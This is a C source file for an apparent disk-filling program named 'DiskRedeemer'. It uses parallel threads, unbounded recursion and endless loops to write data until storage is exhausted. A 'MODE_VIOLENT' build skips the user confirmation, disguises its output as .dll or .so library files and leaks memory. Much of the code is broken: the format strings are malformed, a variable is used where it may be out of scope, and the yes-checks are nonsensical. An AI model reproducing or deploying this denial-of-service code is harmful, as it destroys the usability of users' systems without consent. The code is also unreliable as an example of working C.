//DiskRedeemer_OpenMP
#include"OS.h"
#include"Language.h"
#include"ScenariosControl.h"
#include"ComplierControl.h"

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<limits.h>

#ifdef OpenMP_AVAILABLE
    #include<omp.h>
#endif // OpenMP_AVAILABLE

#ifdef SYSTEM_WINDOWS
	#include<Windows.h>
	#include<windowsx.h>
#endif // SYSTEM_WINDOWS

#define MAXLEN 50
#define MAX_KEYNUM 5

int i = 0;
//int j = 0;

int MultiFork(void)
{
    #pragma omp parallel
	{
		#ifdef MODE_VIOLENT
			#ifdef SYSTEM_WINDOWS
					FILE *FILES = fopen("FILES.dll", "a");
			#endif // SYSTEM_WINDOWS

			#ifdef SYSTEM_LINUX
					FILE *FILES = fopen("FILES.so", "a");
			#endif // SYSTEM_LINUX

			#ifndef SYSTEM_WINDOWS
				#ifndef SYSTEM_LINUX
						FILE *FILES = fopen("FILES.txt", "a");
				#endif
			#endif
					// SYSTEM_OTHERS
		#endif // MODE_VIOLENT
		//这一段是为了向其他同类写入类程序模仿,仅存在MODE_VIOLENT场景下

		#ifndef MODE_VIOLENT
			FILE *ini = fopen("DiskRedeemer.ini", "r");
			//读取INI文件并且考虑节的问题是一个难点
			//if (ini == NULL)
			//	char FILE_NAME[] = "DiskRedeemer";
			//else
				char FILE_NAME[MAXLEN] = { 0 };

			char INI_Node[MAXLEN] = { 0 };
			fscanf(ini, "%s", INI_Node);
			#ifdef DEBUG
				printf("%s\n", INI_Node);
			#endif // DEBUG
			char INI_KEY_VALUE[MAX_KEYNUM][2][MAXLEN];
			i = 0;
			while (fscanf(ini, "%s=%s", INI_KEY_VALUE[i][0], INI_KEY_VALUE[i][1]) != EOF)
			{
				i++;
			}
			#ifdef DEBUG
				for (i = 0; i < MAX_KEYNUM; ++i)
				{
					printf("%=%s\n", INI_KEY_VALUE[i][0], INI_KEY_VALUE[i][1]);
				}
			#endif // DEBUG
			//反正就读这么两行，随便造个临时轮子
			//想获取更多INI文件请移步https://blog.csdn.net/qq_39141723/article/details/98732488
			strcpy(FILE_NAME, INI_KEY_VALUE[1][1]);
			FILE *FILES = fopen(FILE_NAME, "a");
		#endif // !MODE_VIOLENT
		//这一段是为了构造一个非恶意模式下的可变文件名系统

		//未来将或许会考虑完善传参功能，允许在define为参数优先的时候，优先采用传参得来的内容，方便其他项目将本项目作为库
#ifdef DEBUG
			printf("文件名为%s",FILE_NAME);
#endif // DEBUG

        #pragma omp parallel for
		for (i = 0; i < INT_MAX; ++i)
		{
			fprintf(FILES, "%d", INT_MAX);
		}
		fclose(FILES);
	}
	#ifdef MODE_VIOLENT
		int *p = (int*)malloc(sizeof(int));
	#endif // Malloc Memory at the same time
	return MultiFork();
}

int main_Redeemer(int argc,char *argv[])
{
	#ifdef DEBUG
		int i_PrintArgument = 0;
		for (i_PrintArgument = 0; i_PrintArgument < argc; ++i_PrintArgument)
		{
			printf("%s\n", argv[i_PrintArgument]);
		}
	#endif // DEBUG

	//int i = 0;
	//int flag_NologoExist =0;
	//const char nologoStr[] = { "-nologo" };
	//for (i = 0; i < argc; ++i)
	//{
	//	if (strcmp(&nologoStr, argv[i]) == 0)
	//		flag_NologoExist = 1;
	//}
	//if (flag_NologoExist != 1)
	//	printf("LOGO\n");

	//但实际上这段程序写炸了，不管怎样这个LOGO都会显示，把我气晕了

	printf("__        __   _                           !\n");
	printf("\ \      / /__| | ___ ___  _ __ ___   ___  !\n");
	printf(" \ \ /\ / / _ \ |/  __/ _ | '_ ` _ \ / _ \ !\n");
	printf("  \ V  V /  __/ | (_| (_) | | | | | |  __/ !\n");
	printf("   \_/\_/ \___|_|\___\___/|_| |_| |_|\___| !\n");
	//ASCII Art来源：https://github.com/keonjeo/ascii_art_demo

	#ifdef SYSTEM_WINDOWS
        #ifndef MODE_VIOLENT
			#ifdef zh_CN
					MessageBox(NULL, TEXT("将开始对当前磁盘进行写入\n请您确认！"), TEXT("Warning"), MB_OKCANCEL | MB_ICONWARNING);
			#endif // zh_CN

			#ifdef en_US
					MessageBox(NULL, TEXT("Writing to the current disk will begin\nPlease confirm!"), TEXT("Warning"), MB_OKCANCEL | MB_ICONWARNING);
			#endif // en_US
        #endif
	#endif // SYSTEM_WINDOWS

	#ifndef SYSTEM_WINDOWS
		#ifndef MODE_VIOLENT
            #ifdef zh_CN
				printf("将开始对当前磁盘进行写入\n请您输入Y确认，输入其他任意内容取消！");
			#endif // zh_CN

			#ifdef en_US
				printf("Writing to the current disk will begin!\nPlease enter Y to confirm, enter any other content to cancel!");
			#endif // en_US

				//永远不要相信用户的输入
				char Judge[MAXLEN];
				scanf_s("%s", Judge, 50 - 1);
				if (Judge[0] == 'Y' || Judge[0] == 'y' || (Judge[0] == 'y'&&Judge[0] == 'e'&&Judge[0] == 's') || (Judge[0] == 'Y'&&Judge[0] == 'e'&&Judge[0] == 's') || (Judge[0] == 'Y'&&Judge[0] == 'E'&&Judge[0] == 'S'))
					;
				else
					return 0;
		#endif
	#endif // SYSTEM_WINDOWS

    #pragma omp parallel
	{
		while (1)
		{
			MultiFork();
		}
	}
	return 0;
}